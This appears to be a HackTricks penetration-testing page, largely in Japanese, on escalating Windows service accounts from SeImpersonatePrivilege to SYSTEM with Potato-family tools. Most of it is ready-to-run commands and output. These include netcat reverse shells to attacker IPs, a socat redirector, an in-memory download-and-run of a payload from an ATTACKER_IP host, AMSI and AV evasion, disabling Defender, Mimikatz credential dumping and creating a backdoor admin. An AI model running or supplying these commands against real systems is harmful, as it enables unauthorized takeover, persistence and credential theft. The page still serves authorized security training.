# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotatoは動作しません** Windows Server 2019 および Windows 10 build 1809以降では。 しかし、[**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**、**[**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**、**[**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**、**[**GodPotato**](https://github.com/BeichenDream/GodPotato)**、**[**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**、**[**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** は同等の権限を利用して `NT AUTHORITY\SYSTEM` レベルのアクセスを取得するために使用できます。こちらの [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) は `PrintSpoofer` ツールを詳細に解説しており、JuicyPotatoがもはや動作しない Windows 10 および Server 2019 ホストでインパーソネーション権限を悪用するために使用できます。

> [!TIP]
> 2024–2025 年に頻繁にメンテナンスされている現代的な代替として SigmaPotato（GodPotato のフォーク）があり、インメモリ/.NET リフレクションの使用や拡張された OS サポートを追加しています。下のクイック使用法と References のリポジトリを参照してください。

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requirements and common gotchas

All the following techniques rely on abusing an impersonation-capable privileged service from a context holding either of these privileges:

- SeImpersonatePrivilege（最も一般的）または SeAssignPrimaryTokenPrivilege
- High integrity は必須ではありません。トークンにすでに SeImpersonatePrivilege がある場合（IIS AppPool、MSSQL など多くのサービスアカウントで典型的）

Check privileges quickly:
```cmd
whoami /priv | findstr /i impersonate
```
運用ノート:

- シェルが SeImpersonatePrivilege を持たない制限トークンで実行されている場合（特に Local Service/Network Service ではよくある）、FullPowers でアカウントのデフォルト特権を回復してから Potato を実行してください。例: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer は Print Spooler サービスが起動しており、ローカルの RPC エンドポイント (spoolss) 経由で到達可能である必要があります。PrintNightmare 後に Spooler が無効化されている堅牢な環境では、RoguePotato/GodPotato/DCOMPotato/EfsPotato を優先してください。
- RoguePotato は TCP/135 上で到達可能な OXID resolver を必要とします。egress がブロックされている場合は、リダイレクタ／ポートフォワーダを使用してください（下の例参照）。古いビルドでは -f フラグが必要でした。
- EfsPotato/SharpEfsPotato は MS-EFSR を悪用します。あるパイプがブロックされている場合は、代替パイプ（lsarpc, efsrpc, samr, lsass, netlogon）を試してください。
- RpcBindingSetAuthInfo 実行中のエラー 0x6d3 は、通常、未知またはサポートされていない RPC 認証サービスを示します。別のパイプ／トランスポートを試すか、対象サービスが実行中であることを確認してください。
- DeadPotato のような “Kitchen-sink” フォークは、ディスクに触れる余分なペイロードモジュール（Mimikatz/SharpHound/Defender off）をバンドルしています。スリムなオリジナルと比べて EDR による検出率が高くなることを想定してください。

## クイックデモ

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
注意:
- 現在のコンソールで対話型プロセスを生成するには -i を、ワンライナーを実行するには -c を使用できます。
- Spooler サービスが必要です。無効化されていると失敗します。

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
アウトバウンド 135 がブロックされている場合、リダイレクタ上で socat 経由で OXID resolver を pivot してください:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotatoは、2022年末に公開された新しいCOM悪用プリミティブで、Spooler/BITSではなく**PrintNotify**サービスを標的にします。バイナリはPrintNotify COMサーバーをインスタンス化し、偽の`IUnknown`を差し替え、`CreatePointerMoniker`を介して特権コールバックを発生させます。PrintNotifyサービス（**SYSTEM**として実行）が接続してくると、プロセスは返されたトークンを複製し、完全な権限で指定されたペイロードを起動します。

Key operational notes:

* Print Workflow/PrintNotifyサービスがインストールされていれば、Windows 10/11およびWindows Server 2012–2022で動作します（レガシーのSpoolerがPrintNightmare後に無効化されている場合でも存在します）。
* 呼び出しコンテキストが**SeImpersonatePrivilege**を保持している必要があります（IIS APPPOOL、MSSQL、スケジュールされたタスクのサービスアカウントなどで典型的）。
* 直接コマンドまたはインタラクティブモードのどちらかを受け付け、元のコンソール内に留まることができます。例：

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* 完全にCOMベースであるため、named-pipeリスナーや外部リダイレクタは不要で、DefenderがRoguePotatoのRPCバインディングをブロックするホストでのドロップイン代替となります。

Ink Dragonのようなオペレーターは、SharePointでViewState RCEを獲得した直後にPrintNotifyPotatoを実行し、`w3wp.exe`ワーカーからSYSTEMへピボットしてShadowPadをインストールします。

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
ヒント: もし一つの pipe が失敗したり EDR によってブロックされたりしたら、他のサポートされている pipes を試してください:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
注記:
- SeImpersonatePrivilege が存在する場合、Windows 8/8.1–11 および Server 2012–2022 で動作します。

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato は、RPC_C_IMP_LEVEL_IMPERSONATE をデフォルトとするサービス DCOM オブジェクトを標的とする 2 種類のバリアントを提供します。付属のバイナリをビルドするか使用し、コマンドを実行してください:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (更新された GodPotato フォーク)

SigmaPotato は .NET reflection を介したインメモリ実行や PowerShell reverse shell helper といったモダンな機能を追加します。
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- 組み込みの reverse shell フラグ `--revshell` と、PowerShell の 1024 文字制限の撤廃により、長い AMSI-bypassing payloads を一度に実行できます。
- リフレクションに親和性のある構文 (`[SigmaPotato]::Main()`)、および単純なヒューリスティクスを混乱させるための `VirtualAllocExNuma()` を使った簡易的な AV evasion トリック。
- PowerShell Core 環境向けに .NET 2.0 でコンパイルされた別個の `SigmaPotatoCore.exe`。

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato は GodPotato の OXID/DCOM impersonation chain を維持しつつ、post-exploitation ヘルパーを組み込んでいるため、オペレーターは追加ツールなしで即座に SYSTEM を奪い、persistence/collection を実行できます。

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — SYSTEM として任意のコマンドを実行する。
- `-rev <ip:port>` — 簡易的な reverse shell。
- `-newadmin user:pass` — persistence のためのローカル admin を作成する。
- `-mimi sam|lsa|all` — Mimikatz を展開して実行し、credentials をダンプする（ディスクに書き込み、非常にノイジー）。
- `-sharphound` — SYSTEM として SharpHound の collection を実行する。
- `-defender off` — Defender の real-time protection をオフにする（非常にノイジー）。

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
余分なバイナリを同梱しているため、AV/EDR による検知が高くなることが予想されます。ステルス性が重要な場合は、よりスリムな GodPotato/SigmaPotato を使用してください。

## 参考文献

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
